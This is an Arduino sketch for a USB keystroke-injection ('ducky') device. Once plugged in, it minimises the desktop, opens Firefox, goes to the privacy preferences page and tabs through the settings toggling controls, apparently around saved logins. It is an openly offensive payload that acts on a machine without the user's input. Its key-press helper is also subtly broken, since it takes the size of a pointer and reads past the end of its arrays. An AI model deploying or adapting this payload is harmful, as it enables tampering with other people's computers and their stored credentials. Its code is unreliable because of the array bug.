#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  startBuffer(); //Buffer to unplug or upload
  desktopStart();
  ducky();
}

// This is a 10 second count down timer which delay the execution of the file
// Allows time to upload a new script or stop a script to the system
// Do NOT edit
void startBuffer() {
  for (int x = 0; x < 10; x++) {
    digitalWrite(LED_BUILTIN, HIGH);
    delay(500);
    digitalWrite(LED_BUILTIN, LOW);
    delay(500);
  }
}

//Here is where the payload program will exist
void ducky() {
  //Open firefox
  int runKeys[2] = {KEY_LEFT_GUI,114};
  simulType(runKeys);
  delay(500);
  Keyboard.print("firefox");
  delay(500);
  typeKey(KEY_RETURN);
  delay(8000); //Give chance for firefox to load

  delay(500);
  //Traverse to saved login
  int searchBarKeys[2] = {KEY_LEFT_CTRL,108};
  simulType(searchBarKeys);
  Keyboard.print("about:preferences#privacy"); //about:preferences#privacy
  delay(500);
  typeKey(KEY_RETURN);
  delay(1000);
  typeKey(KEY_TAB);
  typeKey(KEY_TAB);
  typeKey(KEY_TAB);
  typeKey(KEY_DOWN_ARROW);
  typeKey(KEY_DOWN_ARROW);
  typeKey(KEY_TAB);
  typeKey(KEY_TAB);
  typeKey(KEY_TAB);
  typeKey(32);
  typeKey(KEY_TAB);
  typeKey(32);
  typeKey(KEY_TAB);
  typeKey(32);
  typeKey(KEY_TAB);
  typeKey(32);
  for (int i = 0; i < 47; i++) {
    typeKey(KEY_TAB);
  }
  typeKey(32);
}

//Type and release a chosen key
void typeKey(int key)
{
  Keyboard.press(key);
  delay(100);
  Keyboard.release(key);
  delay(200);
}

//Deals with multiple key presses, will press multiple keys together
//Ex. int keysToSimulPress[3] = {KEY_LEFT_CTRL,KEY_LEFT_ALT,KEY_DELETE};
void simulType(int keys[]) {
  int numOfKeys = sizeof(keys);
  for (int i = 0; i <= numOfKeys; i++) {
    //Serial.print(keys[i]);
    
    Keyboard.press(keys[i]);
    delay(10);
  }
  Keyboard.releaseAll();
}

//Forces a users system to look at the desktop
//Minimizes all the windows
void desktopStart() {
  delay(100);
  int dStartKeys[2] = {KEY_LEFT_GUI,109};
  simulType(dStartKeys);
  delay(100);
}

//Signifier that the payload has completed execution
void endBlink() {
  digitalWrite(LED_BUILTIN, HIGH);
  delay(1000);
  digitalWrite(LED_BUILTIN, LOW);
  delay(1000);
}

void loop() {
  endBlink();
}
